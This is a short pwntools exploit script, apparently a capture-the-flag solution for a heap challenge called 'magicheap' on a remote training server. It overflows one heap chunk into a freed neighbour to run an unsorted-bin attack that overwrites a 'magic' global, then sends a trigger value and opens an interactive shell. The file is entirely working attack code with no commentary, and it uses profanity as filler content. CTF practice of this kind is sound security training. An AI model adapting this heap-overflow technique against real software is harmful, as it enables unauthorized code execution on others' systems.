from pwn import *
r = remote('node3.buuoj.cn',26152)
#r = process('./magicheap')
def add(size,content):
    r.recvuntil(':')
    r.sendline('1')
    r.recvuntil(':')
    r.sendline(str(size))
    r.recvuntil(':')
    r.sendline(content)


def edit(index,size,content):
    r.recvuntil(':')
    r.sendline('2')
    r.recvuntil(':')
    r.sendline(str(index))
    r.recvuntil(':')
    r.sendline(str(size))
    r.recvuntil(':')
    r.sendline(content)


def free(index):
    r.recvuntil(':')
    r.sendline('3')
    r.recvuntil(':')
    r.sendline(str(index))

magic = 0x6020A0
add(0x80,'fuck')
add(0x80,'fuck')
add(0x80,'fuck')
free(1)
payload = 'a'*0x80+p64(0)+p64(0x91)+p64(0)+p64(magic-0x10)
edit(0,0x100,payload)
add(0x80,'fuck')

r.sendline('4869')

r.interactive()